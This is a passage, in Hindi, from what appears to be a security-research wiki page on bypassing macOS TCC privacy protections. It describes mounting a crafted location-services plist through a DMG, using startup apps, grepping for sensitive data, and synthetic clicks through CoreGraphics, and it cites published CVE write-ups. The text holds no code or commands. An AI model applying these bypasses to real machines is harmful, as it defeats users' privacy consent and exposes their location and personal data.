**`/var/db/locationd/clients.plist`** में तीसरा TCC डेटाबेस है जो स्थान सेवाओं तक पहुंचने की अनुमति देने वाले ग्राहकों को दर्शाता है।\
फ़ोल्डर **`/var/db/locationd/` DMG माउंटिंग से सुरक्षित नहीं था** इसलिए हमारे खुद के plist को माउंट करना संभव था।

## स्टार्टअप ऐप्स द्वारा

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep द्वारा

कई अवसरों में फ़ाइलें संवेदनशील जानकारी जैसे ईमेल, फ़ोन नंबर, संदेश... को सुरक्षित स्थानों में संग्रहित करेंगी (जो Apple में एक दोष माना जाएगा)।

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## सिंथेटिक क्लिक्स

यह अब काम नहीं करता, लेकिन यह [**पहले काम करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

एक और तरीका [**CoreGraphics घटनाएँ**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) का उपयोग करके:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## संदर्भ

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
